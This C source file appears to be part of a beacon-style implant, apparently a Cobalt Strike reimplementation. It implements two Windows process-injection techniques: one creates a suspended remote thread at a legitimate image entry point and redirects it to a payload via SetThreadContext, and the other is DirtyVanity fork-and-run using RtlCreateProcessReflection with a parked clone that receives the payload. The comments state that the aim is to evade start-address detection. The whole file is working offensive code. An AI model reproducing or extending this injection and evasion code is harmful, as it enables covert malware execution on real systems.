/*
 * Tier-2 item 7 (4.11/4.12 injection-technique family):
 *
 *  - PI_EXEC_OBFSETTHREADCONTEXT (0x09): CreateRemoteThread(suspended) with
 *    the thread start address set to the target's own image entry point,
 *    then SetThreadContext to the payload. The kernel-recorded StartAddress
 *    stays a legitimate image entry, which is the whole point of the 4.11
 *    default technique (defeats Get-InjectedThreadEx-style start-address
 *    checks). x64 -> x64 only.
 *
 *  - PI_EXEC_DIRTYVANITY (0x0A): fork&run through RtlCloneUserProcess - the
 *    patsy is a CLONE of our own host process (identical, legitimate image)
 *    instead of a freshly spawned binary. x64 only. Applied at the spawn
 *    sites (command_inject / command_job_spawn_logic), not in the execute
 *    chain itself, because it replaces the patsy rather than the trigger.
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"
#include "syscalls.h"
#include "spawn_trace.h"

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
typedef NTSTATUS(NTAPI *fRtlCloneUserProcess)(ULONG, void *, HANDLE *, HANDLE *);
typedef NTSTATUS(NTAPI *fNtQueryInformationProcess)(HANDLE, ULONG, void *, ULONG, ULONG *);

/* minimal winternl shape (avoid header dependencies) */
typedef struct _T2_PBI {
	void     * Reserved1;
	void     * PebBaseAddress;
	void     * Reserved2[2];
	ULONG_PTR  UniqueProcessId;
	void     * Reserved3;
} T2_PROCESS_BASIC_INFORMATION;

#define ProcessBasicInformation 0
#define CLONE_PROCESS_FLAGS     0x00000001

/* walk the remote process's PEB to its EXE entry point (x64 layouts) */
static void * remote_exe_entry_x64(HANDLE hProcess) {
	fNtQueryInformationProcess pQIP;
	unsigned char              peb[0x20];
	unsigned char              dos[0x40];
	unsigned char              nth[0x60];
	void                     * pebaddr = NULL;
	unsigned long long         imagebase = 0;
	unsigned long              e_lfanew = 0;
	unsigned long             * aoep;
	SIZE_T                     got = 0;
	T2_PROCESS_BASIC_INFORMATION pbi;

	pQIP = (fNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pQIP == NULL) {
		return NULL;
	}

	ZeroMemory(&pbi, sizeof(pbi));
	if (pQIP(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != 0 || pbi.PebBaseAddress == NULL) {
		return NULL;
	}

	pebaddr = pbi.PebBaseAddress;
	if (!beacon_ReadProcessMemory(hProcess, (char *)pebaddr + 0x10, &imagebase, 8, &got) || got != 8) {
		spawn_log("obf: walk FAIL read imagebase gle=", (long)GetLastError());
		return NULL;
	}
	spawn_log("obf: walk imagebase=", (long)(long long)imagebase);

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase, dos, 0x40, &got) || got != 0x40) {
		spawn_log("obf: walk FAIL read dos gle=", (long)GetLastError());
		return NULL;
	}

	if (dos[0] != 'M' || dos[1] != 'Z') {
		spawn_log("obf: walk FAIL no MZ (stomped headers?)", 0x7fffffff);
		return NULL;
	}

	e_lfanew = *(unsigned long *)(dos + 0x3c);
	if (e_lfanew == 0 || e_lfanew > 0x400) {
		return NULL;
	}

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase + e_lfanew, nth, 0x60, &got) || got != 0x60) {
		return NULL;
	}

	if (nth[0] != 'P' || nth[1] != 'E') {
		return NULL;
	}

	/* OptionalHeader starts at NT headers + 0x18; AddressOfEntryPoint at +0x10 */
	aoep = (unsigned long *)(nth + 0x18 + 0x10);
	return (void *)(DWORD_PTR)((unsigned char *)(DWORD_PTR)imagebase + *aoep);
}

/* 4.11 ObfSetThreadContext: legit start address, payload via context */
BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
#if !defined _M_X64
	/* 4.11 constraint: same architecture, x64 only */
	return FALSE;
#else
	HANDLE hThread = NULL;
	void * legit = NULL;
	CONTEXT c;

	spawn_log("obf: chain entry pid=", (long)context->pid);

	/* same architecture only (4.11 constraint) */
	if (!context->sameArch) {
		spawn_log("obf: FAIL arch mismatch", 0x7fffffff);
		return FALSE;
	}

	/* a suspended target already has a legitimate start address - the plain
	 * SetThreadContext opcode handles that case; this one targets running
	 * processes where we mint a new, legitimately-started thread */
	if (context->isSuspended) {
		spawn_log("obf: FAIL suspended target", 0x7fffffff);
		return FALSE;
	}

	legit = remote_exe_entry_x64(context->hProcess);
	if (legit == NULL) {
		spawn_log("obf: FAIL remote entry walk", 0x7fffffff);
		return FALSE;
	}
	spawn_log("obf: legit entry=", (long)(long long)legit);

	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		spawn_log("obf: FAIL CreateRemoteThread gle=", (long)GetLastError());
		return FALSE;
	}
	spawn_log("obf: CRT ok thread=", (long)(long long)hThread);

	ZeroMemory(&c, sizeof(c));
	c.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &c)) {
		spawn_log("obf: FAIL GetThreadContext gle=", (long)GetLastError());
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}
	spawn_log("obf: GTC ok orig rip=", (long)c.Rip);

	/* route the thread through ntdll!RtlUserThreadStart instead of
	 * jumping straight to the payload: a thread whose context skips the
	 * ntdll bootstrap runs without the GS cookie / TLS / activation
	 * frame setup and dies on its first fault silently (live: inject
	 * into a running host reported execute-ok yet no session ever
	 * checked in). RtlUserThreadStart(StartAddress, Parameter) - the
	 * kernel-recorded StartAddress keeps pointing at the legitimate
	 * image entry from CreateRemoteThread. */
	{
		void * ustart = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
		if (ustart == NULL) {
			spawn_log("obf: FAIL no RtlUserThreadStart", 0x7fffffff);
			TerminateThread(hThread, 0);
			CloseHandle(hThread);
			return FALSE;
		}
		c.Rcx = (DWORD64)lpStartAddress;
		c.Rdx = (DWORD64)lpParameter;
		c.Rip = (DWORD64)ustart;
	}

	if (!SetThreadContext(hThread, &c)) {
		spawn_log("obf: FAIL SetThreadContext gle=", (long)GetLastError());
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}

	ResumeThread(hThread);
	CloseHandle(hThread);
	spawn_log("obf: resumed, payload=", (long)(long long)lpStartAddress);
	return TRUE;
#endif
}

/* does the configured process-inject execute chain contain this opcode? */
BOOL procinj_execute_has(BYTE opcode) {
	char * options = setting_ptr(SETTING_PROCINJ_EXECUTE);
	datap  parser;
	DWORD  op;

	if (options == NULL) {
		return FALSE;
	}

	data_init(&parser, options, 128);

	while (TRUE) {
		op = data_byte(&parser);

		if (op == PI_EXEC_FAIL) {
			return FALSE;
		}

		if (op == opcode) {
			return TRUE;
		}

		/* skip opcode-specific payloads */
		if (op == PI_EXEC_CREATETHREAD_F || op == PI_EXEC_CREATEREMOTETHREAD_F) {
			data_short(&parser);
			data_string_asciiz(&parser);
			data_string_asciiz(&parser);
		}
	}
}

/* 4.12 DirtyVanity fork&run via RtlCreateProcessReflection. The original
 * implementation called the raw ntdll!RtlCloneUserProcess primitive and
 * then ran the normal execute chain inside the clone - but a raw clone
 * lacks the loader bootstrap state a real process start gets, so every
 * thread we minted in it AV'd inside ntdll during init (live: memset
 * movaps at ntdll+0xa4778, deterministic) and calling the raw primitive
 * from a managed host deadlocks outright (reproduced with ctypes/csc
 * probes). The official DirtyVanity contract is the reflection API: it
 * clones the target AND launches the clone's initial thread AT
 * StartAddress, so the payload must simply live in the forked address
 * space before the fork. New shape: inject_dirtyvanity_forkrun points
 * the whole inject pipeline at OUR OWN process (local mirror + profile
 * transforms), and the DirtyVanity opcode in the execute chain triggers
 * the reflection - the clone inherits the mirrored payload and its very
 * first thread runs it. Identical image to us, kernel-recorded start
 * address inside that image: the whole point of the technique. */
typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION {
	void * ReflectionThreadHandle; /* phnt layout: thread handle first */
	void * UniqueProcess;          /* CLIENT_ID */
	void * UniqueThread;
} T2_REFLECTION_INFORMATION;

typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void *, void *, void *, T2_REFLECTION_INFORMATION *);

/* ---- fork&run nursery ------------------------------------------------
 * A reflection clone of a beacon that has already run HTTP inherits the
 * live wininet/RPC state; the payload beacon inside the clone dies with a
 * fastfail in RPCRT4 on its first checkin (live, twice). Forking instead
 * at beacon() boot - before any RPC-capable subsystem is touched - gives
 * a pristine clone. The clone's initial thread parks on the mailbox (an
 * inherited copy at the identical VA); the spawn path later writes the
 * payload plus mailbox directly into the parked clone and it jumps. No
 * remote threads, no inherited-runtime poisoning, identical image. */
typedef struct {
	volatile LONG go;
	char * entry;
	void * param;
} DV_MAILBOX;

static DV_MAILBOX dv_mailbox = { 0, NULL, NULL };
static DWORD dv_clone_pid = 0;

void dv_nursery_trampoline(void * unused) {
	(void)unused;
	while (!dv_mailbox.go)
		Sleep(200);
	((void (*)(void *))dv_mailbox.entry)(dv_mailbox.param);
	for (;;)
		Sleep(60000);
}

void dv_nursery_init(void) {
	fRtlCreateProcessReflection pReflect;
	T2_REFLECTION_INFORMATION info;
	HMODULE nt;
	DWORD pid;

	if (dv_clone_pid != 0)
		return;
	if (!procinj_execute_has(PI_EXEC_DIRTYVANITY))
		return; /* profile does not want fork&run */

	nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return;
	pReflect = (fRtlCreateProcessReflection)GetProcAddress(nt, "RtlCreateProcessReflection");
	if (pReflect == NULL)
		return;

	/* flags: INHERIT_HANDLES | NO_SUSPEND (live matrix; see the flag notes
	 * in git history - every NO_SYNCHRONIZE combo is rejected here) */
	ZeroMemory(&info, sizeof(info));
	if (pReflect(GetCurrentProcess(), 0x2 | 0x4, dv_nursery_trampoline, NULL, NULL, &info) != 0) {
		spawn_log("dv: nursery reflect failed", 0x7fffffff);
		return;
	}

	pid = (DWORD)(DWORD_PTR)info.UniqueProcess;
	if (pid == 0 || pid == GetCurrentProcessId()) {
		spawn_log("dv: nursery layout mismatch?", (long)pid);
		return;
	}
	dv_clone_pid = pid;
	spawn_log("dv: nursery up, clone pid=", (long)pid);
}

BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
#if !defined _M_X64
	return FALSE;
#else
	/* deliver the payload into the parked nursery clone: mirror the dll
	 * RX, mirror the parameter RW, flip the mailbox. The trampoline jumps
	 * to the payload entry (offset 0, the spawn convention). Profile
	 * transforms are not applied on this path. One-shot: the clone runs
	 * the payload beacon from here on. */
	void * remote = NULL;
	void * rparam = NULL;
	SIZE_T got = 0;
	DWORD oldp = 0;
	HANDLE hc;
	DV_MAILBOX mb;

	if (dv_clone_pid == 0)
		return FALSE;

	hc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, dv_clone_pid);
	if (hc == NULL) {
		spawn_log("dv: OpenProcess clone failed gle=", (long)GetLastError());
		return FALSE;
	}

	remote = VirtualAllocEx(hc, NULL, (SIZE_T)dllen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remote == NULL || !WriteProcessMemory(hc, remote, dll, (SIZE_T)dllen, &got) || got != (SIZE_T)dllen) {
		spawn_log("dv: payload write failed gle=", (long)GetLastError());
		CloseHandle(hc);
		return FALSE;
	}
	VirtualProtectEx(hc, remote, (SIZE_T)dllen, PAGE_EXECUTE_READ, &oldp);

	if (plen > 0) {
		rparam = VirtualAllocEx(hc, NULL, (SIZE_T)plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (rparam == NULL || !WriteProcessMemory(hc, rparam, parameter, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
			spawn_log("dv: param write failed gle=", (long)GetLastError());
			CloseHandle(hc);
			return FALSE;
		}
	}

	mb.go    = 1;
	mb.entry = (char *)remote;
	mb.param = rparam;
	/* dv_mailbox lives in our image - the clone's inherited copy sits at
	 * the identical VA (fork preserves the address space) */
	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
		spawn_log("dv: mailbox write failed gle=", (long)GetLastError());
		CloseHandle(hc);
		return FALSE;
	}

	CloseHandle(hc);
	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);
	dv_clone_pid = 0; /* one-shot */
	return TRUE;
#endif
}

